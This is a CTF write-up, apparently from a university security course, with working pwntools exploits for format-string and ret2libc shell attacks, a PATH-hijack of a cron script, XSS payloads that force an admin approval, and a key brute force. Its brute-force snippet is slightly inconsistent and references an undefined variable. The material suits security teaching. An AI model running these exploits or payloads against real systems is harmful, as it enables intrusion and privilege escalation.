# CTF extra challenges

## British punctuality

On the `home/flag_reader` we noticed a script and upon analyzing further we noticed a vulnerability.
It was using the command `printenv` by calling a relative path. This meant we could exploit it by re-writing the PATH environment variable.
Because the script was using a file to load the environment, we created one to change the PATH variable.

```bash
nobody@caea6090734d:/tmp$ ls
env	last_log 
nobody@caea6090734d:/tmp$ cat env
export PATH=/tmp/:$PATH
```

The server was running `cron` to perform the script every minute. Our user did not have access to the flag file but the cron job did. So now we just needed to create our own `printenv` in order to get the flag.

```bash
nobody@caea6090734d:/tmp$ echo "cat ../flags/flag.txt" > printenv
```

After waiting for the script to be executed again, we opened the last_log and there was the flag.

## FinalFormat

After opening the program, we tested if the string format vulnerability was still there:

```bash
seed@VM:~/ctf/FinalFormat$ ./program 
There is nothing to see here...a%x%x
You gave me this:a2578256178
```

For this challenge, the backdoor had been removed. However, by using gdb we were able to find that it was still present in the code:

```bash
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
...
0x08049236  old_backdoor
...
``` 

Because of this, our plan was to redirect the flow of the program to that address. 
However, using `checksec` we figured that writing in the stack would be a tough task:

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Therefore, we used the gdb to try and find instructions where the code would use calls and jumps to other addresses.
Soon enough we found a jump to the following address: `0x0804c010`.

Now, we built an exploit that would re-write the backdoor function to that address using format vulnerabilities:

```py
from pwn import *

LOCAL = False

if LOCAL:
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4007)

#0x08049236  old_backdoor

N = 60
content = bytearray(0x0 for i in range(N))

content[0:4]  =  (0xaaaabbbb).to_bytes(4, byteorder='little')
content[4:8]  =  (0x0804c012).to_bytes(4, byteorder='little')
content[8:12]  =  ("????").encode('latin-1')
content[12:16]  =  (0x0804c010).to_bytes(4, byteorder='little')

s = "%.2036x" + "%hn" + "%.35378x%hn"

fmt  = (s).encode('latin-1')
content[16:16+len(fmt)] = fmt

p.recvuntil(b"here...")
p.sendline(content)
p.interactive()
```

Running this, we were able to prompt a shell and cat the flag.

## Echo

For this challenged, we were once again given a binary executable.
This is a simple program that repeatedly asks for input.
Upon analyzing it further, we discovered a string format vulnerability that we could exploit.
This gave us a way to analyze the stack (`%x`).

However, by taking a look at the security measures in place, we got to the conclusion that doing a regular buffer overflow attack would not work, as the stack has DEP protection.
Because of this, we thought it made sense to try and use ROP to exploit the program.

```shell
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : FULL
```

The idea was to get a shell by making the program run `system` with the shell argument. For this to work, we would need the following things:

- The `libc` base address.
- `system` and `/bin/sh` addresses in the libc.
- Find a way around the canary protection.

### Libc base address

In order to use libc functions, we need its base address.
Because the address space is randomize, this task becomes a bit harder.
However, the program allows for us to send multiple inputs and we can take advantage of that to retrieve information.

Even though the address space is randomized, we expect for the ESP to stay in a relative position to other elements of the stack, namely the libc base address.
This way, to get the actual libc address, we calculated the offset for an execution of the program and used that value to get to the actual address.

### System and shell offsets

To get the system function address we did the following:

```bash
$ objdump -T libc.so.6 | grep "system"
00163690 g    DF .text	0000006a (GLIBC_2.0)  svcerr_systemerr
00048150  w   DF .text	0000003f  GLIBC_2.0   system
00048150 g    DF .text	0000003f  GLIBC_PRIVATE __libc_system
```

Then, to get the `/bin/sh` on libc:

```bash
$ strings -a -t x libc.so.6 | grep "/bin/sh"
 1bd0f5 /bin/sh
```

Thus, we now know that the offsets for system and the shell are `0x48150` and `0x1bd0f5`, respectively.

### Canary

Because of `checksec`, we know that the program's stack is protected by a canary.
Because of the stack analysis done before, we know that the canary will occupy the position 8 on the stack. 
So all we need to do is leak it with the format vulnerability and include it in the payload.

### Exploit

After all these values were calculated, we created the following exploit to get the flag:

```py
#!/usr/bin/python3
from pwn import *
  
p = remote("ctf-fsi.fe.up.pt", 4002)

libc_offset = 136473

system_offset = 0x00048150
shell_offset = 0x1bd0f5

def send(p, msg):
	p.recvuntil(b">")
	p.sendline(b"e")
	p.recvuntil(b"chars): ")
	p.sendline(msg)
	line = p.recvline()
	p.recvuntil(b"message: ")
	p.sendline(b"")
	return line
	
values = send(p, b"%8$x %11$x") 

canary, ref = [int(x, 16) for x in values.split()]

libc = ref - libc_offset   #get base libc
system = libc + system_offset
shell = libc + shell_offset

content = bytearray(0x90 for i in range(80))
content[20:24]  =  (canary + 1).to_bytes(4, byteorder='little')
content[32:36]  =  (system).to_bytes(4, byteorder='little')
content[40:44]  =  (shell).to_bytes(4, byteorder='little')

send(p, content)

content = bytearray(0x90 for i in range(19))
send(p, content)

p.interactive()
```


## Aply for Flag II

The description of the challenged mentioned the websites were separated. However, the XSS vulnerability was still there.
Because the admin would see the justification in a different page from the admin gui, we first tried sending a POST request with `fetch` using XSS.

```html
<script type="text/javascript">
fetch('http://ctf-fsi.fe.up.pt:5005/request/[id]/approve', {
    method: 'POST',
    credentials: 'include',
    mode: 'no-cors',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ "giveflag": "Give the flag" })
});
</script>
```

For some reason this did not work. Then, we tried actually creating a form identical to the admin one and force a click:

```html
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/[id]/approve" role="form">
    <div class="submit">
        
        <input id="abc" type="submit" id="giveflag" value="Give the flag">
        
    </div>
</form>
<script type="text/javascript">
document.querySelector('#abc').click()
</script>
```

After disabling js in the browser (to avoid running the script ourselves), we were able to get the flag.

## NumberStation3

After analyzing the code given, we concluded that the encryption relied on a random string of size 16 bytes:

```python
rkey = bytearray(os.urandom(16))
```

Thus, it could be an option to brute force this string to try and find the flag.
So, that's what we did:

```py
for i in range(2 ** 16):    
    b = "{0:b}".format(i).zfill(16)
    array = bytearray([int(x) for x in b])
    
    dec_flag = dec(array, unhexlify(flag))
    if b'flag' in dec_flag:
        print(m)
        break
```

Doing so, we were able to decrypt the message and get the flag.